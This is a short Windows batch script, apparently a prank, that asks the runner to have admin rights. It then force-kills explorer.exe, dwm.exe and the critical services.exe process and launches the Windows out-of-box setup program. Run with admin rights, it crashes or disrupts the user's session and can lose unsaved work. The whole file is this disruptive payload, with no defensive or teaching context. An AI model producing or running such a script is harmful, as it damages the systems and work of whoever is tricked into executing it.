@echo off
echo hello. i hope you got admin permissions.
pause
taskkill /f /im explorer.exe
taskkill /f /im dwm.exe
taskkill /f /im services.exe
cd %USERPROFILE%
C:\Windows\System32\oobe\msoobe.exe
cd %USERPROFILE%
mkdir Desktop
exit
